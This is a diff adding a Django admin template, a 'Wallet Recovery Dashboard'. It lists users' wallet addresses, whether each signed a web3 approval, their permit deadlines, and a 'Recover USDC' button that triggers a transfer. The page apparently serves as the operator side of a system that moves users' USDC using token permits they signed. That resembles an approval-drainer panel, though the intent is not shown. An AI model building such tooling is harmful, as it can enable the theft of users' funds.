@@ -1,0 +1,62 @@
+{% extends "admin/base_site.html" %}
+{% block content %}
+<h1>Wallet Recovery Dashboard</h1>
+
+<table class="table table-striped">
+  <thead>
+    <tr>
+      <th>User</th>
+      <th>Wallet</th>
+      <th>Approval Signed?</th>
+      <th>Permit Deadline</th>
+      <th>Recovery TX</th>
+      <th>Action</th>
+    </tr>
+  </thead>
+  <tbody>
+    {% for profile in page_obj %}
+    <tr>
+      <td>{{ profile.user.username }}</td>
+      <td>{{ profile.wallet_address }}</td>
+      <td>{{ profile.has_web3_approval }}</td>
+      <td>{{ profile.permit_deadline }}</td>
+      <td>
+        {% if profile.recovery_tx_hash %}
+          <a href="https://etherscan.io/tx/{{ profile.recovery_tx_hash }}" target="_blank">{{ profile.recovery_tx_hash|truncatechars:10 }}</a>
+        {% else %}
+          -
+        {% endif %}
+      </td>
+      <td>
+        {% if not profile.recovery_tx_hash %}
+        <form method="post" action="{% url 'admin_recover_usdc' profile.id %}">
+          {% csrf_token %}
+          <button type="submit" class="btn btn-warning btn-sm">Recover USDC</button>
+        </form>
+        {% else %}
+        <span class="text-success">Recovered</span>
+        {% endif %}
+      </td>
+    </tr>
+    {% endfor %}
+  </tbody>
+</table>
+
+<div class="pagination">
+  <span class="step-links">
+      {% if page_obj.has_previous %}
+          <a href="?page=1">&laquo; first</a>
+          <a href="?page={{ page_obj.previous_page_number }}">previous</a>
+      {% endif %}
+
+      <span class="current">
+          Page {{ page_obj.number }} of {{ page_obj.paginator.num_pages }}.
+      </span>
+
+      {% if page_obj.has_next %}
+          <a href="?page={{ page_obj.next_page_number }}">next</a>
+          <a href="?page={{ page_obj.paginator.num_pages }}">last &raquo;</a>
+      {% endif %}
+  </span>
+</div>
+{% endblock %}
